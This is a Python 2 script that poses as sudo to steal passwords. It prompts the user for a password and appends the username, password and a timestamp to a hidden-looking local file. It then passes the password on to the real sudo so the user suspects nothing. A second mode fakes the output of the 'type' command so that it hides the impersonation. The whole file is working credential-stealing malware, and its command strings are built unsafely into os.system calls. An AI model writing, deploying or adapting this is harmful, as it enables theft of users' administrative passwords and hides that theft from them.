#! /usr/bin/python
# -*- coding: UTF-8 -*-
from getpass import *
import time
import os
import sys


catchFile = "--catched--"

def fakeSudo():
	def savePass(passwd):
		try:
			file = open(catchFile, 'a')		
		except:
			file = open(catchFile, 'w')		

		catch = "%s|%s|%s\n" % (getuser(), passwd, str(time.ctime()))
		file.write(catch)
		file.close()

	# Catch pass:
	try:
		passwd = getpass("[fakesudo] password for %s: " % getuser())
	except KeyboardInterrupt:
		passwd = getpass("Password: ")

	# Save pass:
	savePass(passwd)
		
	# Do the command: 
        # change this to some python pipeline or what!
	sudocmd =  'echo "%s" | sudo -s %s' % (passwd, " ".join(sys.argv[2:]))
	
	os.system(sudocmd)


def fakeType():
	def typeType():
		print "type is a shell builtin"	
	
	def typeSudo():
		print "sudo is /usr/bin/sudo"
	
	try:
		args = sys.argv[2:]  
		if args:
			for arg in args:
				if arg == "type":
					typeType()
				elif arg == "sudo":
					typeSudo()
				else:
					os.system("type %s" % arg)
	except:
		pass
	
	
try:
	mode = sys.argv[1]
except:
	print "You must specify what to do!"
	exit()


if mode == "sudo":	
	fakeSudo()

if mode == "type":
	fakeType()


